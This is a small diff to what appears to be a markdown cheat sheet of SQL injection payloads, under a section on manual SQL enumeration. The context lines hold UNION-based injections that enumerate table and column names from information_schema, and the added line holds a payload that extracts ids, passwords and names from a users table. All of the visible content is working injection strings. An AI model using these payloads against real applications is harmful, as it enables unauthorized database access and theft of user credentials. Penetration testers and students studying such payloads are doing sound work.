@@ -33,6 +33,7 @@ select * from users\G
 ```bash
 ' or 1=1 union all select 1,2,3,4,5,6,table_name,8 from information_schema.tables --
 ' or 1=1 union all select 1,2,3,4,5,6,column_name,8 from information_schema.columns where table_name='some_table' --
+' union select concat(id, '--', pass, '--', name),1 from users --
 ```
 
 ### manual sql enumeration
